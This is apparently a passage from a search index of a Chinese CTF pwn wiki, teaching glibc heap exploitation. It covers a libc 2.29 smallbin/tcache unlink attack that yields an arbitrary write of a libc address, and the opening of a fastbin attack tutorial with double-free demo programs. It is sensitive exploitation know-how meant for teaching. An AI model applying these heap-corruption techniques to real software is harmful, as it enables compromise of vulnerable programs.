\u63d0\u53d6\u5373\u5c06\u653e\u5165tcache\u5806\u5757\u7684\u540e\u4e00\u5757chunk */ bck = tc_victim -> bk ; /* \u8bbe\u7f6e\u6807\u5fd7\u4f4d */ set_inuse_bit_at_offset ( tc_victim , nb ); if ( av != & main_arena ) set_non_main_arena ( tc_victim ); /* \u76f4\u63a5unlink\u5c06tc_victim\u53d6\u51fa\uff0c\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5 */ bin -> bk = bck ; bck -> fd = bin ; /* \u5c06tc_victim\u653e\u5165tcache */ tcache_put ( tc_victim , tc_idx ); } } } #endif void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } } smallbin \u5269\u4f59\u5806\u5757 unlink \u53d6\u51fa\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff1a if ( tc_victim != 0 ) { /* \u63d0\u53d6\u5373\u5c06\u653e\u5165tcache\u5806\u5757\u7684\u540e\u4e00\u5757chunk */ bck = tc_victim -> bk ; /* \u8bbe\u7f6e\u6807\u5fd7\u4f4d */ set_inuse_bit_at_offset ( tc_victim , nb ); if ( av != & main_arena ) set_non_main_arena ( tc_victim ); /* \u76f4\u63a5unlink\u5c06tc_victim\u53d6\u51fa\uff0c\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5 */ bin -> bk = bck ; bck -> fd = bin ; \u6d89\u53ca\u5229\u7528\u7684\u51e0\u6761\u5173\u952e\u8bed\u53e5\uff1a bck = tc_victim -> bk ; bin -> bk = bck ; bck -> fd = bin ; bin \u662f\u4e00\u4e2a libc \u5730\u5740\uff0c\u4e5f\u5c31\u662f 0x7f \u5f00\u5934\u7684 6 \u4f4d\u5730\u5740\u3002 \u5f53\u52ab\u6301 tc_victim->bk \u4e5f\u5c31\u662f\u63a7\u5236 bck \u4e3a\u6211\u4eec \u653b\u51fb\u5730\u5740-0x10 \uff0c bck->fd = bin; \u5c06 bin \u5199\u5165\u653b\u51fb\u5730\u5740\u3002\u5b9e\u73b0\u6548\u679c\u4e3a\uff1a * ( target -0x10 ) = bin \u653b\u51fb\u5b8c\u6210\uff08\u653e\u5165\u4e00\u4e2a\u5806\u5757\uff09\u540e\uff0c\u8fd9\u65f6\u539f\u6765\u7684\u94fe\u8868\u88ab\u6253\u4e71\u65e0\u6cd5\u53d6\u51fa\u4e0b\u4e00\u4e2a\u5806\u5757\uff0c\u6240\u4ee5\u653b\u51fb\u524d\u9700\u8981\u8ba9\u5bf9\u5e94\u5927\u5c0f tcache \u6570\u91cf\u4e3a 6 \uff0c\u653e\u5165\u4e00\u4e2a\u5806\u5b8c\u6210\u653b\u51fb\u5c31\u9000\u51fa\u5faa\u73af\u4e0d\u518d\u653e\u5165\u5806\u5757\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u9000\u51fa\u3002 \u4e3a\u4e86\u4e0d\u62a5\u9519\u9700\u8981\u540c\u4e00\u5927\u5c0f\u5806\u5757\u5728 tcache \u6709 6 \u4e2a \u3001 smallbin \u6709 2 \u4e2a \u3002\u56e0\u4e3a tcache \u673a\u5236\uff0ctcache \u6ca1\u6709\u6ee1\u65f6\u88ab\u91ca\u653e\u5806\u5757\u662f\u653e\u4e0d\u8fdb smallbin \u3002 \u7528\u5207\u5272 unsortedbin \u65b9\u6cd5\u5728 smallbin \u653e\u5165\u4e24\u4e2a\u5806\u5757\uff0c\u5373 last remainder \u3002\u5c31\u662f\u5728 unsortedbin \u62ff\u4e86\u4e00\u5927\u5757\u5806\u5757\uff0c\u5982\u679c\u7528\u5269\u4e0b\u7684\u5927\u4e8e remainder_size \uff0c\u5c31\u5c06\u5269\u4e0b\u7684\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; av -> last_remainder = remainder ; remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); set_foot ( remainder , remainder_size ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } \u5047\u8bbe unsortedbin \u4e2d\u6709\u4e00\u4e2a 0x400 \u5806\uff0cmalloc 0x300 \u540e\uff0cunsorbin \u5269\u4e0b 0x100 \u3002\u8fd9\u65f6 malloc \u4e00\u4e2a\u6bd4 0x100 \u5927\u7684\u7a7a\u95f4\uff0c\u7cfb\u7edf\u904d\u5386 unsortedbin \u5c06\u5404\u4e2a\u5806\u5757\u653e\u5165\u5bf9\u5e94\u7684 bin \u4e2d\uff0c0x100 \u987a\u5229\u653e\u5165 smallbin\u3002 \u5806\u5e03\u7f6e\u56fe\u793a\uff1a chunk1 fd \u6307\u9488\u9700\u8981\u662f chunk0 \u5730\u5740\uff0c\u7528\u6765\u7ed5\u8fc7 chunk0 \u5206\u914d\u65f6\u7684\u68c0\u67e5\uff1a /* \u68c0\u67e5\u540e\u4e00\u4e2achunk fd\u6307\u9488\u662f\u5426\u6307\u5411\u5f53\u524dchunk\uff0c\u9632\u6b62\u4f2a\u9020 */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): smallbin double linked list corrupted\" ); \u603b\u7ed3 \u00b6 \u4f7f\u7528\u524d\u63d0\uff1a UAF\uff1a\u7528\u4e8e\u4fee\u6539 chunk1 \u7684 bk \u6709\u80fd\u591f\u8df3\u8fc7 tcache \u7533\u8bf7\u5806\u7684\u51fd\u6570\u6216\u673a\u5236\uff1a\u89e6\u53d1 smallbin unlink \u653e\u5165 tcache \u80fd\u6cc4\u9732\u5806\u5730\u5740\uff1achunk1 fd \u586b\u4e3a chunk0 \u5730\u5740\uff0c\u8ba9 chunk0 \u6210\u529f\u5206\u914d \u5b9e\u73b0\u6548\u679c\uff1a \u4efb\u610f\u5730\u5740\u5199\u5165\u4e00\u4e2a libc \u5730\u5740\uff080x7fxxxxxxxxxx) \u5e94\u7528\uff1a \u53ef\u4ee5\u53c2\u8003 libc2.23 unlink \u76f8\u5173\u4f8b\u9898 \u00b6 HITCON CTF 2019 Quals \u2014 One Punch Man [Black Watch \u5165\u7fa4\u9898]PWN2 \u53c2\u8003\u6587\u7ae0 \u00b6 HITCON CTF 2019 Quals \u2014 One Punch Man HITCON2019-Quals One_punch_Man glibc2.29\u4e0bunsortedbin_attack\u7684\u66ff\u4ee3\u65b9\u6cd5","title":"libc2.29\u7c7bunlink_attack"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#libc229-unlink-attack","text":"","title":"Libc2.29 unlink Attack"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#unsortbin","text":"libc2.23 \u6ca1\u6709\u5bf9 unsortedbin \u8fdb\u884c\u5b8c\u6574\u6027\u68c0\u67e5\uff1a for (;; ) { int iters = 0 ; while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( victim -> size <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( victim -> size > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); libc2.29 \u589e\u52a0\u4e86\u5b8c\u6574\u6027\u68c0\u67e5\uff1a /* \u5f00\u59cb\u904d\u5386\u6574\u7406unsorted bin\u5c06\u5806\u5757\u653e\u5165\u5bf9\u5e94\u5404\u79cdbin\u4e2d*/ for (;; ) { int iters = 0 ; while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { /* \u63d0\u53d6\u5012\u6570\u7b2c\u4e8c\u4e2achunk */ bck = victim -> bk ; size = chunksize ( victim ); mchunkptr next = chunk_at_offset ( victim , size ); /* libc2.29\u65b0\u589e\u5b8c\u6574\u6027\u68c0\u67e5 */ if ( __glibc_unlikely ( size <= 2 * SIZE_SZ ) || __glibc_unlikely ( size > av -> system_mem )) malloc_printerr ( \"malloc(): invalid size (unsorted)\" ); if ( __glibc_unlikely ( chunksize_nomask ( next ) < 2 * SIZE_SZ ) || __glibc_unlikely ( chunksize_nomask ( next ) > av -> system_mem )) malloc_printerr ( \"malloc(): invalid next size (unsorted)\" ); if ( __glibc_unlikely (( prev_size ( next ) & ~ ( SIZE_BITS )) != size )) malloc_printerr ( \"malloc(): mismatching next->prev_size (unsorted)\" ); if ( __glibc_unlikely ( bck -> fd != victim ) || __glibc_unlikely ( victim -> fd != unsorted_chunks ( av ))) malloc_printerr ( \"malloc(): unsorted double linked list corrupted\" ); if ( __glibc_unlikely ( prev_inuse ( next ))) malloc_printerr ( \"malloc(): invalid next->prev_inuse (unsorted)\" );","title":"unsortbin \u53d8\u5316"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#_1","text":"\u5f53 malloc\u3001calloc \u4e4b\u7c7b\u7684\u4ece smallbin \u4e2d\u53d6\u5806\u5757\u65f6\uff0c\u53d6\u51fa\u6210\u529f\u540e\uff0c\u5982\u679c tcache \u6ca1\u6709\u6ee1\u5c31\u4f1a\u5c06 smallbin \u5269\u4e0b\u7684\u5806\u5757\u653e\u5165 tcache \u4e2d\uff0c\uff1a /* malloc\u4ecesmall bin\u53d6\u7a7a\u95f4 */ if ( in_smallbin_range ( nb )) { idx = smallbin_index ( nb ); bin = bin_at ( av , idx ); /* \u5bf9\u5e94\u5927\u5c0fsmall bin\u4e0d\u4e3a\u7a7a\u65f6 */ if (( victim = last ( bin )) != bin ) { /* \u63d0\u524d\u540e\u4e00\u4e2achunk */ bck = victim -> bk ; /* \u68c0\u67e5\u540e\u4e00\u4e2achunk fd\u6307\u9488\u662f\u5426\u6307\u5411\u5f53\u524dchunk\uff0c\u9632\u6b62\u4f2a\u9020 */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): smallbin double linked list corrupted\" ); /* \u8bbe\u7f6einuse\u4f4d */ set_inuse_bit_at_offset ( victim , nb ); /* unlink\u53d6\u51favictim */ bin -> bk = bck ; bck -> fd = bin ; if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); #if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ /* \u5f53\u524dsize smallbin\u8fd8\u6709\u5806\u5757\u65f6\uff0c\u5c06\u5269\u4e0bsmallbin\u653e\u5165\u5bf9\u5e94\u5927\u5c0ftcache\u3002\u524d\u63d0\u662ftcache\u6709\u7a7a\u4f59\u4f4d\u7f6e */ /* \u83b7\u53d6size\u5bf9\u5e94\u7684tcache\u5e8f\u53f7 */ size_t tc_idx = csize2tidx ( nb ); if ( tcache && tc_idx < mp_ . tcache_bins ) { mchunkptr tc_victim ; /* While bin not empty and tcache not full, copy chunks over. */ /* \u68c0\u67e5tcache\u6709\u6ca1\u6709\u6ee1\u548csmallbin\u6709\u6ca1\u6709\u5269\u4f59\u5806\u5757 */ while ( tcache -> counts [ tc_idx ] < mp_ . tcache_count && ( tc_victim = last ( bin )) != bin ) { if ( tc_victim != 0 ) { /* \u63d0\u53d6\u5373\u5c06\u653e\u5165tcache\u5806\u5757\u7684\u540e\u4e00\u5757chunk */ bck = tc_victim -> bk ; /* \u8bbe\u7f6e\u6807\u5fd7\u4f4d */ set_inuse_bit_at_offset ( tc_victim , nb ); if ( av != & main_arena ) set_non_main_arena ( tc_victim ); /* \u76f4\u63a5unlink\u5c06tc_victim\u53d6\u51fa\uff0c\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5 */ bin -> bk = bck ; bck -> fd = bin ; /* \u5c06tc_victim\u653e\u5165tcache */ tcache_put ( tc_victim , tc_idx ); } } } #endif void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } } smallbin \u5269\u4f59\u5806\u5757 unlink \u53d6\u51fa\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff1a if ( tc_victim != 0 ) { /* \u63d0\u53d6\u5373\u5c06\u653e\u5165tcache\u5806\u5757\u7684\u540e\u4e00\u5757chunk */ bck = tc_victim -> bk ; /* \u8bbe\u7f6e\u6807\u5fd7\u4f4d */ set_inuse_bit_at_offset ( tc_victim , nb ); if ( av != & main_arena ) set_non_main_arena ( tc_victim ); /* \u76f4\u63a5unlink\u5c06tc_victim\u53d6\u51fa\uff0c\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5 */ bin -> bk = bck ; bck -> fd = bin ; \u6d89\u53ca\u5229\u7528\u7684\u51e0\u6761\u5173\u952e\u8bed\u53e5\uff1a bck = tc_victim -> bk ; bin -> bk = bck ; bck -> fd = bin ; bin \u662f\u4e00\u4e2a libc \u5730\u5740\uff0c\u4e5f\u5c31\u662f 0x7f \u5f00\u5934\u7684 6 \u4f4d\u5730\u5740\u3002 \u5f53\u52ab\u6301 tc_victim->bk \u4e5f\u5c31\u662f\u63a7\u5236 bck \u4e3a\u6211\u4eec \u653b\u51fb\u5730\u5740-0x10 \uff0c bck->fd = bin; \u5c06 bin \u5199\u5165\u653b\u51fb\u5730\u5740\u3002\u5b9e\u73b0\u6548\u679c\u4e3a\uff1a * ( target -0x10 ) = bin \u653b\u51fb\u5b8c\u6210\uff08\u653e\u5165\u4e00\u4e2a\u5806\u5757\uff09\u540e\uff0c\u8fd9\u65f6\u539f\u6765\u7684\u94fe\u8868\u88ab\u6253\u4e71\u65e0\u6cd5\u53d6\u51fa\u4e0b\u4e00\u4e2a\u5806\u5757\uff0c\u6240\u4ee5\u653b\u51fb\u524d\u9700\u8981\u8ba9\u5bf9\u5e94\u5927\u5c0f tcache \u6570\u91cf\u4e3a 6 \uff0c\u653e\u5165\u4e00\u4e2a\u5806\u5b8c\u6210\u653b\u51fb\u5c31\u9000\u51fa\u5faa\u73af\u4e0d\u518d\u653e\u5165\u5806\u5757\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u9000\u51fa\u3002 \u4e3a\u4e86\u4e0d\u62a5\u9519\u9700\u8981\u540c\u4e00\u5927\u5c0f\u5806\u5757\u5728 tcache \u6709 6 \u4e2a \u3001 smallbin \u6709 2 \u4e2a \u3002\u56e0\u4e3a tcache \u673a\u5236\uff0ctcache \u6ca1\u6709\u6ee1\u65f6\u88ab\u91ca\u653e\u5806\u5757\u662f\u653e\u4e0d\u8fdb smallbin \u3002 \u7528\u5207\u5272 unsortedbin \u65b9\u6cd5\u5728 smallbin \u653e\u5165\u4e24\u4e2a\u5806\u5757\uff0c\u5373 last remainder \u3002\u5c31\u662f\u5728 unsortedbin \u62ff\u4e86\u4e00\u5927\u5757\u5806\u5757\uff0c\u5982\u679c\u7528\u5269\u4e0b\u7684\u5927\u4e8e remainder_size \uff0c\u5c31\u5c06\u5269\u4e0b\u7684\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; av -> last_remainder = remainder ; remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); set_foot ( remainder , remainder_size ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } \u5047\u8bbe unsortedbin \u4e2d\u6709\u4e00\u4e2a 0x400 \u5806\uff0cmalloc 0x300 \u540e\uff0cunsorbin \u5269\u4e0b 0x100 \u3002\u8fd9\u65f6 malloc \u4e00\u4e2a\u6bd4 0x100 \u5927\u7684\u7a7a\u95f4\uff0c\u7cfb\u7edf\u904d\u5386 unsortedbin \u5c06\u5404\u4e2a\u5806\u5757\u653e\u5165\u5bf9\u5e94\u7684 bin \u4e2d\uff0c0x100 \u987a\u5229\u653e\u5165 smallbin\u3002 \u5806\u5e03\u7f6e\u56fe\u793a\uff1a chunk1 fd \u6307\u9488\u9700\u8981\u662f chunk0 \u5730\u5740\uff0c\u7528\u6765\u7ed5\u8fc7 chunk0 \u5206\u914d\u65f6\u7684\u68c0\u67e5\uff1a /* \u68c0\u67e5\u540e\u4e00\u4e2achunk fd\u6307\u9488\u662f\u5426\u6307\u5411\u5f53\u524dchunk\uff0c\u9632\u6b62\u4f2a\u9020 */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): smallbin double linked list corrupted\" );","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#_2","text":"\u4f7f\u7528\u524d\u63d0\uff1a UAF\uff1a\u7528\u4e8e\u4fee\u6539 chunk1 \u7684 bk \u6709\u80fd\u591f\u8df3\u8fc7 tcache \u7533\u8bf7\u5806\u7684\u51fd\u6570\u6216\u673a\u5236\uff1a\u89e6\u53d1 smallbin unlink \u653e\u5165 tcache \u80fd\u6cc4\u9732\u5806\u5730\u5740\uff1achunk1 fd \u586b\u4e3a chunk0 \u5730\u5740\uff0c\u8ba9 chunk0 \u6210\u529f\u5206\u914d \u5b9e\u73b0\u6548\u679c\uff1a \u4efb\u610f\u5730\u5740\u5199\u5165\u4e00\u4e2a libc \u5730\u5740\uff080x7fxxxxxxxxxx) \u5e94\u7528\uff1a \u53ef\u4ee5\u53c2\u8003 libc2.23 unlink","title":"\u603b\u7ed3"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#_3","text":"HITCON CTF 2019 Quals \u2014 One Punch Man [Black Watch \u5165\u7fa4\u9898]PWN2","title":"\u76f8\u5173\u4f8b\u9898"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/#_4","text":"HITCON CTF 2019 Quals \u2014 One Punch Man HITCON2019-Quals One_punch_Man glibc2.29\u4e0bunsortedbin_attack\u7684\u66ff\u4ee3\u65b9\u6cd5","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/glibc-heap/fastbin/","text":"Fastbin Attack \u00b6 \u4ecb\u7ecd \u00b6 fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a \u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 free \u51fd\u6570\u91ca\u653e**\u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk**\uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 fd \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 malloc \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002 \u539f\u7406 \u00b6 fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x30 ); chunk2 = malloc ( 0x30 ); chunk3 = malloc ( 0x30 ); //\u8fdb\u884c\u91ca\u653e free ( chunk1 ); free ( chunk2 ); free ( chunk3 ); return 0 ; } \u91ca\u653e\u524d 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000000000 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000602000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000602040 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011 \u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080] ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) Fastbin Double Free \u00b6 \u4ecb\u7ecd \u00b6 Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6 (type confused) \u7684\u6548\u679c\u3002 Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0 fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002 /* Another simple check: make sure the top of the bin is not the record we are going to add (i.e., double free). */ if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } \u6f14\u793a \u00b6 \u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk1 ); return 0 ; } \u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c] ./tst[0x4005a2] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830] ./tst[0x400499] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 02200000-02221000 rw-p 00000000 00:00 0 [heap] 7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0 [stack] 7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0 [vvar] 7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); free ( chunk1 ); return 0 ; } \u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1) 